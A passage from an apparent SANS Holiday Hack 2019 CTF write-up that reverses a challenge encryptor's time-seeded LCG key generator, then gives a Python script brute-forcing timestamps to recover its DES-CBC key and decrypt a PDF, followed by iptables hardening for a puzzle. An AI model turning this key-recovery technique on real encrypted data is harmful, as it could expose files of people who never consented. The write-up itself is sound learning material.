</span><span class="hll"><span class="err">00631</span><span class="nl">E3C:</span> <span class="err">0</span><span class="nf">F</span> <span class="nv">B6</span> <span class="nv">C8</span>             <span class="nv">movzx</span>       <span class="nb">ecx</span><span class="p">,</span><span class="nb">al</span>
</span><span class="hll"><span class="err">00631</span><span class="nl">E3F:</span> <span class="err">81</span> <span class="nf">E1</span> <span class="nv">FF</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>    <span class="nv">and</span>         <span class="nb">ecx</span><span class="p">,</span><span class="mh">0FFh</span>
</span><span class="hll"><span class="err">00631</span><span class="nl">E45:</span> <span class="err">8</span><span class="nf">B</span> <span class="mi">55</span> <span class="mi">08</span>             <span class="nv">mov</span>         <span class="nb">edx</span><span class="p">,</span><span class="kt">dword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nv">buffer</span><span class="p">]</span>
</span><span class="hll"><span class="err">00631</span><span class="nl">E48:</span> <span class="err">03</span> <span class="err">55</span> <span class="nf">FC</span>             <span class="nv">add</span>         <span class="nb">edx</span><span class="p">,</span><span class="kt">dword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nv">i</span><span class="p">]</span>
</span><span class="hll"><span class="err">00631</span><span class="nl">E4B:</span> <span class="err">88</span> <span class="err">0</span><span class="nf">A</span>                <span class="nv">mov</span>         <span class="kt">byte</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">edx</span><span class="p">],</span><span class="nb">cl</span>
</span><span class="hll"><span class="err">00631</span><span class="nl">E4D:</span> <span class="nf">EB</span> <span class="nv">D9</span>                <span class="nv">jmp</span>         <span class="nv">generate_key</span><span class="o">+</span><span class="mh">38h</span> <span class="p">(</span><span class="mh">0631E28h</span><span class="p">)</span>
</span><span class="err">00631</span><span class="nl">E4F:</span> <span class="err">8</span><span class="nf">B</span> <span class="nv">E5</span>                <span class="nv">mov</span>         <span class="nb">esp</span><span class="p">,</span><span class="nb">ebp</span>
<span class="err">00631</span><span class="nl">E51:</span> <span class="err">5</span><span class="nf">D</span>                   <span class="nv">pop</span>         <span class="nb">ebp</span>
<span class="err">00631</span><span class="nl">E52:</span> <span class="nf">C3</span>                   <span class="nv">ret</span>
</pre></div>
</td></tr></table><p>Interesting! It seems that the function calls <code>time</code>, surely to
initialize the seed, as suspected. Then, the function <code>super_secure_srand</code>
is called. Finally, there seems to be a loop, where the function
<code>super_secure_random</code> is called (line 23), until <code>eax</code> is equal to
8 (lines 20, 21, 22). If you remember the execution of the program, the
generated key has a length of 8 bytes. So, the function
<code>super_secure_random</code> must be used to generate the bytes of the key, one
by one.</p>
<p>Let's first take a look at the <code>super_secure_srand</code> function:</p>
<div class="highlight"><pre><span></span><span class="err">0</span><span class="nf">x00401d90</span>      <span class="mi">55</span>             <span class="nv">push</span> <span class="nb">ebp</span>
<span class="err">0</span><span class="nf">x00401d91</span>      <span class="mi">8</span><span class="nv">bec</span>           <span class="nv">mov</span> <span class="nb">ebp</span><span class="p">,</span> <span class="nb">esp</span>
<span class="err">0</span><span class="nf">x00401d93</span>      <span class="mi">8</span><span class="nv">b4508</span>         <span class="nv">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="kt">dword</span> <span class="p">[</span><span class="nv">arg_8h</span><span class="p">]</span>     <span class="c1">; [0x8:4]=-1 ; 8</span>
<span class="err">0</span><span class="nf">x00401d96</span>      <span class="mi">50</span>             <span class="nv">push</span> <span class="nb">eax</span>
<span class="err">0</span><span class="nf">x00401d97</span>      <span class="mi">68</span><span class="nv">e8424000</span>     <span class="nv">push</span> <span class="nv">str.Seed____d</span>          <span class="c1">; 0x4042e8 ; &quot;Seed = %d\n\n&quot;</span>
<span class="err">0</span><span class="nf">x00401d9c</span>      <span class="nv">ff15cc404000</span>   <span class="nv">call</span> <span class="kt">dword</span> <span class="p">[</span><span class="nv">sym.imp.MSVCR90.dll___iob_func</span><span class="p">]</span> <span class="c1">; pdb.__imp____iob_func ; 0x4040cc</span>
<span class="err">0</span><span class="nf">x00401da2</span>      <span class="mi">83</span><span class="nv">c040</span>         <span class="nv">add</span> <span class="nb">eax</span><span class="p">,</span> <span class="mh">0x40</span>               <span class="c1">; &#39;@&#39;</span>
<span class="err">0</span><span class="nf">x00401da5</span>      <span class="mi">50</span>             <span class="nv">push</span> <span class="nb">eax</span>
<span class="err">0</span><span class="nf">x00401da6</span>      <span class="nv">ff15c8404000</span>   <span class="nv">call</span> <span class="kt">dword</span> <span class="p">[</span><span class="nv">sym.imp.MSVCR90.dll_fprintf</span><span class="p">]</span> <span class="c1">; pdb.__imp__fprintf ; 0x4040c8</span>
<span class="err">0</span><span class="nf">x00401dac</span>      <span class="mi">83</span><span class="nv">c40c</span>         <span class="nv">add</span> <span class="nb">esp</span><span class="p">,</span> <span class="mh">0xc</span>
<span class="err">0</span><span class="nf">x00401daf</span>      <span class="mi">8</span><span class="nv">b4d08</span>         <span class="nv">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="kt">dword</span> <span class="p">[</span><span class="nv">arg_8h</span><span class="p">]</span>     <span class="c1">; [0x8:4]=-1 ; 8</span>
<span class="err">0</span><span class="nf">x00401db2</span>      <span class="mi">890</span><span class="nv">d2c604000</span>   <span class="nv">mov</span> <span class="kt">dword</span> <span class="p">[</span><span class="mh">0x40602c</span><span class="p">],</span> <span class="nb">ecx</span>   <span class="c1">; [0x40602c:4]=0</span>
<span class="err">0</span><span class="nf">x00401db8</span>      <span class="mi">5</span><span class="nv">d</span>             <span class="nv">pop</span> <span class="nb">ebp</span>
<span class="err">0</span><span class="nf">x00401db9</span>      <span class="nv">c3</span>             <span class="nv">ret</span>
</pre></div>
<p>It seems to only print the seed message that we saw during the execution. Now,
let's see the function <code>super_secure_random</code>:</p>
<div class="highlight"><pre><span></span><span class="err">00631</span><span class="nl">DC0:</span> <span class="err">55</span>                   <span class="nf">push</span>        <span class="nb">ebp</span>
<span class="err">00631</span><span class="nl">DC1:</span> <span class="err">8</span><span class="nf">B</span> <span class="nv">EC</span>                <span class="nv">mov</span>         <span class="nb">ebp</span><span class="p">,</span><span class="nb">esp</span>
<span class="err">00631</span><span class="nl">DC3:</span> <span class="nf">A1</span> <span class="mi">2</span><span class="nv">C</span> <span class="mi">60</span> <span class="mi">63</span> <span class="mi">00</span>       <span class="nv">mov</span>         <span class="nb">eax</span><span class="p">,</span><span class="kt">dword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nv">state</span> <span class="p">(</span><span class="mh">063602Ch</span><span class="p">)]</span>
<span class="err">00631</span><span class="nl">DC8:</span> <span class="err">69</span> <span class="nf">C0</span> <span class="nv">FD</span> <span class="mi">43</span> <span class="mi">03</span> <span class="mi">00</span>    <span class="nv">imul</span>        <span class="nb">eax</span><span class="p">,</span><span class="nb">eax</span><span class="p">,</span><span class="mh">343FDh</span>
<span class="err">00631</span><span class="nl">DCE:</span> <span class="err">05</span> <span class="nf">C3</span> <span class="mi">9</span><span class="nv">E</span> <span class="mi">26</span> <span class="mi">00</span>       <span class="nv">add</span>         <span class="nb">eax</span><span class="p">,</span><span class="mh">269EC3h</span>
<span class="err">00631</span><span class="nl">DD3:</span> <span class="nf">A3</span> <span class="mi">2</span><span class="nv">C</span> <span class="mi">60</span> <span class="mi">63</span> <span class="mi">00</span>       <span class="nv">mov</span>         <span class="kt">dword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nv">state</span> <span class="p">(</span><span class="mh">063602Ch</span><span class="p">)],</span><span class="nb">eax</span>
<span class="err">00631</span><span class="nl">DD8:</span> <span class="nf">A1</span> <span class="mi">2</span><span class="nv">C</span> <span class="mi">60</span> <span class="mi">63</span> <span class="mi">00</span>       <span class="nv">mov</span>         <span class="nb">eax</span><span class="p">,</span><span class="kt">dword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nv">state</span> <span class="p">(</span><span class="mh">063602Ch</span><span class="p">)]</span>
<span class="err">00631</span><span class="nl">DDD:</span> <span class="nf">C1</span> <span class="nv">F8</span> <span class="mi">10</span>             <span class="nv">sar</span>         <span class="nb">eax</span><span class="p">,</span><span class="mh">10h</span>
<span class="err">00631</span><span class="nl">DE0:</span> <span class="err">25</span> <span class="nf">FF</span> <span class="mi">7</span><span class="nv">F</span> <span class="mi">00</span> <span class="mi">00</span>       <span class="nv">and</span>         <span class="nb">eax</span><span class="p">,</span><span class="mh">7FFFh</span>
<span class="err">00631</span><span class="nl">DE5:</span> <span class="err">5</span><span class="nf">D</span>                   <span class="nv">pop</span>         <span class="nb">ebp</span>
<span class="err">00631</span><span class="nl">DE6:</span> <span class="nf">C3</span>                   <span class="nv">ret</span>
</pre></div>
<p>There seems to be a pointer to a variable <code>state</code>. Here are the
operations:</p>
<ol class="arabic simple">
<li>The content of this <code>state</code> variable is copied to <code>eax</code>.</li>
<li><code>eax</code> is multiplied by 0x343FD, and the result is stored in
<code>eax</code>.</li>
<li>0x269EC3 is added to <code>eax</code>, and the result is stored in <code>eax</code>.</li>
<li>This value is stored in the <code>state</code> variable.</li>
<li><code>eax</code> is shifted by 0x10 bits to the right.</li>
<li><code>eax</code> is bit-<code>AND</code>-ed with 0x7FFF.</li>
</ol>
<p>This function is first called with the Unix timestamp as a seed, and is then
called seven more times to generate the full key. It took a bit of dynamic
analysis with Visual Studio's debugger to understand what was being done.</p>
<p>Here's an implementation of the key generation in python:</p>
<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">generate_key</span><span class="p">(</span><span class="n">seed</span><span class="p">):</span>
    <span class="n">key</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>

    <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">:</span>
        <span class="n">seed</span><span class="p">,</span> <span class="n">key_byte</span> <span class="o">=</span> <span class="n">super_secure_random</span><span class="p">(</span><span class="n">seed</span><span class="p">)</span>
        <span class="n">key</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">key_byte</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span>

    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">super_secure_random</span><span class="p">(</span><span class="n">seed</span><span class="p">):</span>
    <span class="n">seed</span> <span class="o">=</span> <span class="n">seed</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span>

    <span class="n">next_seed</span> <span class="o">=</span> <span class="n">seed</span>
    <span class="n">next_seed</span> <span class="o">=</span> <span class="p">(</span><span class="n">next_seed</span> <span class="o">*</span> <span class="mh">0x343FD</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span>
    <span class="n">next_seed</span> <span class="o">=</span> <span class="p">(</span><span class="n">next_seed</span> <span class="o">+</span> <span class="mh">0x269EC3</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span>

    <span class="n">key_byte</span> <span class="o">=</span> <span class="p">(</span><span class="n">next_seed</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x7FFF</span>

    <span class="k">return</span> <span class="n">next_seed</span><span class="p">,</span> <span class="n">key_byte</span>
</pre></div>
<p>The <code>&amp; 0xFFFFFFFF</code> operations are to make sure that every computation is
done on 32-bit values. Let's see if our function works. Let's use the seed in
our first encryption, <code>1578230480</code>, and see if we generate the same key:</p>
<div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">seed</span> <span class="o">=</span> <span class="mi">1578230480</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">print</span><span class="p">(</span><span class="n">generate_key</span><span class="p">(</span><span class="n">seed</span><span class="p">)</span><span class="o">.</span><span class="n">hex</span><span class="p">())</span>
<span class="go">a0ad8f3edde93d45</span>
</pre></div>
<p>Hurray, we get the same key! Now let's try to decrypt our PDF file. But wait,
what is the encryption algorithm? Well, the encryption key is 8-byte long,
which is 56 bits (not super long). The most symetric algorithm using this key
size is <a class="reference external" href="https://en.wikipedia.org/wiki/Data_Encryption_Standard">DES</a>. We
can check that by taking a look at the function <code>do_encrypt</code>:</p>
<div class="highlight"><pre><span></span><span class="err">[</span><span class="nf">...</span><span class="p">]</span>
<span class="err">0</span><span class="nf">x0040270a</span>      <span class="mi">68000000</span><span class="nv">f0</span>     <span class="nv">push</span> <span class="mh">0xf0000000</span>
<span class="err">0</span><span class="nf">x0040270f</span>      <span class="mi">6</span><span class="nv">a01</span>           <span class="nv">push</span> <span class="mi">1</span>                      <span class="c1">; 1</span>
<span class="err">0</span><span class="nf">x00402711</span>      <span class="mi">6870474000</span>     <span class="nv">push</span> <span class="mh">0x404770</span>               <span class="c1">; &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot;</span>
<span class="err">0</span><span class="nf">x00402716</span>      <span class="mi">6</span><span class="nv">a00</span>           <span class="nv">push</span> <span class="mi">0</span>
<span class="err">0</span><span class="nf">x00402718</span>      <span class="mi">8</span><span class="nv">d4df4</span>         <span class="nv">lea</span> <span class="nb">ecx</span><span class="p">,</span> <span class="kt">dword</span> <span class="p">[</span><span class="nb">ebp</span> <span class="o">-</span> <span class="mh">0xc</span><span class="p">]</span>
<span class="err">0</span><span class="nf">x0040271b</span>      <span class="mi">51</span>             <span class="nv">push</span> <span class="nb">ecx</span>
<span class="err">0</span><span class="nf">x0040271c</span>      <span class="nv">ff1504404000</span>   <span class="nv">call</span> <span class="kt">dword</span> <span class="p">[</span><span class="nv">sym.imp.ADVAPI32.dll_CryptAcquireContextA</span><span class="p">]</span> <span class="c1">; pdb.__imp__CryptAcquireContextA_20 ; 0x404004</span>
<span class="err">[</span><span class="nf">...</span><span class="p">]</span>
</pre></div>
<p>The function <a class="reference external" href="https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptacquirecontexta">CryptAcquireContextA</a>
is called to obtain an encryption object. The cryptographic service provider
seems to be <a class="reference external" href="https://docs.microsoft.com/en-us/windows/win32/seccrypto/microsoft-enhanced-cryptographic-provider">Microsoft Enhanced Cryptographic Provider v1.0</a>,
which does seem to use DES as an encryption algorithm.</p>
<p>Now, DES is a <a class="reference external" href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation">block cipher</a>,
and several mode can be used. I first tried ECB on some test files, but it
didn't seem to work: only the first block seemed correctly decrypted. This
seems to indicate that the used mode is CBC, with an initialization vector
full of null bytes.</p>
<p>Now that we have everything, let's try to decrypt our PDF file:</p>
<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python3</span>

<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">datetime</span>

<span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">DES</span>

<span class="k">def</span> <span class="nf">generate_key</span><span class="p">(</span><span class="n">seed</span><span class="p">):</span>
    <span class="n">key</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>

    <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">:</span>
        <span class="n">seed</span><span class="p">,</span> <span class="n">key_byte</span> <span class="o">=</span> <span class="n">super_secure_random</span><span class="p">(</span><span class="n">seed</span><span class="p">)</span>
        <span class="n">key</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">key_byte</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span>

    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">super_secure_random</span><span class="p">(</span><span class="n">seed</span><span class="p">):</span>
    <span class="n">seed</span> <span class="o">=</span> <span class="n">seed</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span>

    <span class="n">next_seed</span> <span class="o">=</span> <span class="n">seed</span>
    <span class="n">next_seed</span> <span class="o">=</span> <span class="p">(</span><span class="n">next_seed</span> <span class="o">*</span> <span class="mh">0x343FD</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span>
    <span class="n">next_seed</span> <span class="o">=</span> <span class="p">(</span><span class="n">next_seed</span> <span class="o">+</span> <span class="mh">0x269EC3</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span>

    <span class="n">key_byte</span> <span class="o">=</span> <span class="p">(</span><span class="n">next_seed</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x7FFF</span>

    <span class="k">return</span> <span class="n">next_seed</span><span class="p">,</span> <span class="n">key_byte</span>

<span class="k">def</span> <span class="nf">decrypt_file</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
    <span class="n">decryptor</span> <span class="o">=</span> <span class="n">DES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">mode</span><span class="o">=</span><span class="n">DES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">IV</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s1">&#39;</span><span class="p">)</span>

    <span class="n">plain_text</span> <span class="o">=</span> <span class="n">decryptor</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">plain_text</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s1">&#39;usage: {} &lt;file_to_decrypt&gt;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span>

    <span class="n">encrypted_file_name</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">encrypted_file_name</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>

    <span class="c1"># We know the file was encrypted on December 6, 2019, between 7pm and 9pm UTC</span>
    <span class="n">initial_time</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="p">(</span><span class="mi">2019</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mo">00</span><span class="p">,</span> <span class="mo">00</span><span class="p">,</span> <span class="n">tzinfo</span><span class="o">=</span><span class="n">datetime</span><span class="o">.</span><span class="n">timezone</span><span class="o">.</span><span class="n">utc</span><span class="p">)</span>
    <span class="n">end_time</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="p">(</span><span class="mi">2019</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">21</span><span class="p">,</span> <span class="mo">00</span><span class="p">,</span> <span class="mo">00</span><span class="p">,</span> <span class="n">tzinfo</span><span class="o">=</span><span class="n">datetime</span><span class="o">.</span><span class="n">timezone</span><span class="o">.</span><span class="n">utc</span><span class="p">)</span>

    <span class="n">min_seed</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">initial_time</span><span class="o">.</span><span class="n">timestamp</span><span class="p">())</span>
    <span class="n">max_seed</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">end_time</span><span class="o">.</span><span class="n">timestamp</span><span class="p">())</span>

    <span class="k">while</span> <span class="n">min_seed</span> <span class="o">&lt;=</span> <span class="n">max_seed</span><span class="p">:</span>
        <span class="n">key_candidate</span> <span class="o">=</span> <span class="n">generate_key</span><span class="p">(</span><span class="n">min_seed</span><span class="p">)</span>
        <span class="n">decrypted_file</span> <span class="o">=</span> <span class="n">decrypt_file</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">key_candidate</span><span class="p">)</span>
        <span class="c1"># We know the file is a PDF, so we look for the beginning of a PDF</span>
        <span class="c1"># file. If the decrypted data starts with &quot;%PDF&quot;, we must have</span>
        <span class="c1"># found the correct key.</span>
        <span class="k">if</span> <span class="n">decrypted_file</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;%PDF&#39;</span><span class="p">):</span>
            <span class="n">decrypted_file_name</span> <span class="o">=</span> <span class="s1">&#39;./{}_{}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">key_candidate</span><span class="o">.</span><span class="n">hex</span><span class="p">(),</span> <span class="n">encrypted_file_name</span><span class="p">)</span>
            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">decrypted_file_name</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
                <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">decrypted_file</span><span class="p">)</span>

            <span class="k">print</span><span class="p">(</span><span class="s1">&#39;[+] We managed to decrypt the file&#39;</span><span class="p">)</span>
            <span class="k">print</span><span class="p">(</span><span class="s1">&#39;[*] Initial seed: {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">min_seed</span><span class="p">))</span>
            <span class="k">print</span><span class="p">(</span><span class="s1">&#39;[*] Encryption key: {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">key_candidate</span><span class="o">.</span><span class="n">hex</span><span class="p">()))</span>
            <span class="k">print</span><span class="p">(</span><span class="s1">&#39;[+] Decrypted file saved under {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">decrypted_file_name</span><span class="p">))</span>
            <span class="k">break</span>
        <span class="n">min_seed</span> <span class="o">+=</span> <span class="mi">1</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</pre></div>
<p>Let's launch our script:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> ./decrypt_file.py ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf.enc
<span class="go">[+] We managed to decrypt the file</span>
<span class="go">[*] Initial seed: 1575663650</span>
<span class="go">[*] Encryption key: b5ad6a321240fbec</span>
<span class="go">[+] Decrypted file saved under ./b5ad6a321240fbec_ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf.enc</span>
</pre></div>
<p>Yay! We managed to decrypt the file. You can download it <a class="reference external" href="/docs/sans-christmas-challenge-2019/ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf">here</a>.
It seems to be a quick start guide for Santa's Super Sled-O-Matic Machine
Learning Sleigh Route Finder, which seems to be a device mounted on Santa's
sled to help him find his route for his delivery.</p>
</div>
</div>
<div class="section" id="objective-11">
<h2><a class="toc-backref" href="#id37">Objective 11:</a></h2>
<div class="section" id="kent-tinseltooth-s-cranberry-pi-challenge">
<h3><a class="toc-backref" href="#id38">Kent Tinseltooth's Cranberry Pi Challenge</a></h3>
<p>We arrive on Kent having an internal monologue. Apparently his IoT braces were
hacked:</p>
<div class="highlight"><pre><span></span><span class="go">Inner Voice: Kent. Kent. Wake up, Kent.</span>
<span class="go">Inner Voice: I&#39;m talking to you, Kent.</span>
<span class="go">Kent TinselTooth: Who said that? I must be going insane.</span>
<span class="go">Kent TinselTooth: Am I?</span>
<span class="go">Inner Voice: That remains to be seen, Kent. But we are having a conversation.</span>
<span class="go">Inner Voice: This is Santa, Kent, and you&#39;ve been a very naughty boy.</span>
<span class="go">Kent TinselTooth: Alright! Who is this?! Holly? Minty? Alabaster?</span>
<span class="go">Inner Voice: I am known by many names. I am the boss of the North Pole. Turn to me and be hired after graduation.</span>
<span class="go">Kent TinselTooth: Oh, sure.</span>
<span class="go">Inner Voice: Cut the candy, Kent, you&#39;ve built an automated, machine-learning, sleigh device.</span>
<span class="go">Kent TinselTooth: How did you know that?</span>
<span class="go">Inner Voice: I&#39;m Santa - I know everything.</span>
<span class="go">Kent TinselTooth: Oh. Kringle. *sigh*</span>
<span class="go">Inner Voice: That&#39;s right, Kent. Where is the sleigh device now?</span>
<span class="go">Kent TinselTooth: I can&#39;t tell you.</span>
<span class="go">Inner Voice: How would you like to intern for the rest of time?</span>
<span class="go">Kent TinselTooth: Please no, they&#39;re testing it at srf.elfu.org using default creds, but I don&#39;t know more. It&#39;s classified.</span>
<span class="go">Inner Voice: Very good Kent, that&#39;s all I needed to know.</span>
<span class="go">Kent TinselTooth: I thought you knew everything?</span>
<span class="go">Inner Voice: Nevermind that. I want you to think about what you&#39;ve researched and studied. From now on, stop playing with your teeth, and floss more.</span>
<span class="go">*Inner Voice Goes Silent*</span>

<span class="go">Kent TinselTooth: Oh no, I sure hope that voice was Santa&#39;s.</span>
<span class="go">Kent TinselTooth: I suspect someone may have hacked into my IOT teeth braces.</span>
<span class="go">Kent TinselTooth: I must have forgotten to configure the firewall...</span>
<span class="go">Kent TinselTooth: Please review /home/elfuuser/IOTteethBraces.md and help me configure the firewall.</span>
<span class="go">Kent TinselTooth: Please hurry; having this ribbon cable on my teeth is uncomfortable.</span>
<span class="gp">elfuuser@54cbc0276e93:~$</span>
</pre></div>
<p>He needs our help to harden the firewall rules for his braces, even though he
was super rude during our Splunk experiment! Let's take a look at the rules he
needs implemented:</p>
<div class="highlight"><pre><span></span><span class="gp">elfuuser@54cbc0276e93:~$</span> cat /home/elfuuser/IOTteethBraces.md
</pre></div>
<pre class="literal-block">
# ElfU Research Labs - Smart Braces
### A Lightweight Linux Device for Teeth Braces
### Imagined and Created by ElfU Student Kent TinselTooth

This device is embedded into one's teeth braces for easy management and monitoring of dental status. It uses FTP and HTTP for management and monitoring purposes but also has SSH for remote access. Please refer to the management documentation for this purpose.

## Proper Firewall configuration:

The firewall used for this system is `iptables`. The following is an example of how to set a default policy with using `iptables`:

```
sudo iptables -P FORWARD DROP
```

The following is an example of allowing traffic from a specific IP and to a specific port:

```
sudo iptables -A INPUT -p tcp --dport 25 -s 172.18.5.4 -j ACCEPT
```

A proper configuration for the Smart Braces should be exactly:

1. Set the default policies to DROP for the INPUT, FORWARD, and OUTPUT chains.
2. Create a rule to ACCEPT all connections that are ESTABLISHED,RELATED on the INPUT and the OUTPUT chains.
3. Create a rule to ACCEPT only remote source IP address 172.19.0.225 to access the local SSH server (on port 22).
4. Create a rule to ACCEPT any source IP to the local TCP services on ports 21 and 80.
5. Create a rule to ACCEPT all OUTPUT traffic with a destination TCP port of 80.
6. Create a rule applied to the INPUT chain to ACCEPT all traffic from the lo interface.
</pre>
<p>Let's take care of the first rule, setting the default policies to <code>DROP</code>
for the three mentioned chains:</p>
<div class="highlight"><pre><span></span><span class="gp">elfuuser@54cbc0276e93:~$</span> sudo iptables -P INPUT DROP
<span class="gp">elfuuser@54cbc0276e93:~$</span> sudo iptables -P FORWARD DROP
<span class="gp">elfuuser@54cbc0276e93:~$</span> sudo iptables -P OUTPUT DROP
</pre></div>
<p>On to the second rule. We must accept already established incoming and outgoing
connections:</p>
<div class="highlight"><pre><span></span><span class="gp">elfuuser@e57e7cd77272:~$</span> sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
<span class="gp">elfuuser@e57e7cd77272:~$</span> sudo iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
</pre></div>
<p>For the third rule, we must restrict input connections. To be more specific,
only the IP address <code>172.19.0.225</code> is allowed to access the local SSH
server on TCP port 22:</p>
<div class="highlight"><pre><span></span><span class="gp">elfuuser@e57e7cd77272:~$</span> sudo iptables -A INPUT -s <span class="m">172</span>.19.0.225/32 -p tcp --dport <span class="m">22</span> -j ACCEPT
</pre></div>
<p>The fourth rule also concerns incoming connections. However, the rule is a bit
more permissive: anyone can connect to the TCP port 21 and 80:</p>
<div class="highlight"><pre><span></span><span class="gp">elfuuser@e57e7cd77272:~$</span> sudo iptables -A INPUT -p tcp --dport <span class="m">21</span> -j ACCEPT
<span class="gp">elfuuser@e57e7cd77272:~$</span> sudo iptables -A INPUT -p tcp --dport <span class="m">80</span> -j ACCEPT
</pre></div>
<p>The fifth rule concerns outgoing traffic: we must allow every connection to
external TCP port 80:</p>
<div class="highlight"><pre><span></span><span class="gp">elfuuser@e57e7cd77272:~$</span> sudo iptables -A OUTPUT -p tcp --dport <span class="m">80</span> -j ACCEPT
</pre></div>
<p>Finally, any incoming connection from the loopback <code>lo</code> connection is
authorized:</p>
<div class="highlight"><pre><span></span><span class="gp">elfuuser@e57e7cd77272:~$</span> sudo iptables -A INPUT -i lo -j ACCEPT
</pre></div>
<p>Once we have done everything, Kent thanks us:</p>
<pre class="literal-block">
Kent TinselTooth: Great, you hardened my IOT Smart Braces firewall!
</pre>
</div>
<div class="section" id="open-the-sleigh-shop-door">
<h3><a class="toc-backref" href="#id39">Open the Sleigh Shop Door</a></h3>
<p>We must try to get access to the Sleigh Shop. The door is garded by Shiny
Upatree.</p>
